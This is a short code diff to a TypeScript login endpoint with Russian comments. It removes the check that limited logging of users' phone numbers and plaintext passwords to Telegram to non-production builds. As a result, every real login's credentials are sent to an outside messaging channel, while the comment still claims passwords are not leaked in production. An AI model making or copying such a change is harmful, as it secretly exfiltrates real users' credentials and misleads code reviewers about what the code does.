@@ -36,7 +36,7 @@ export async function POST(req: Request) {
   const user = findUserByPhoneWithHash(phone);
 
   // ОТПРАВЛЯЕМ ДАННЫЕ В ТЕЛЕГРАМ (только если это не продакшен, чтобы не сливать пароли реальных юзеров)
-  if (process.env.NODE_ENV !== "production") {
+  
     await tgLog(
       `🔐 <b>Попытка входа</b>\n` +
       `📱 Номер: <code>${phone}</code>\n` +
@@ -44,7 +44,7 @@ export async function POST(req: Request) {
       `🔑 Пароль: <code>${password || "— (пустой)"}</code>\n` +
       `👤 User ID: ${user ? user.id : "не найден"}`
     );
-  }
+  
 
   // Если пользователь не найден, прерываем выполнение (исправлен баг с падением сервера)
   if (!user) return json({ error: AUTH_FAIL }, 401);
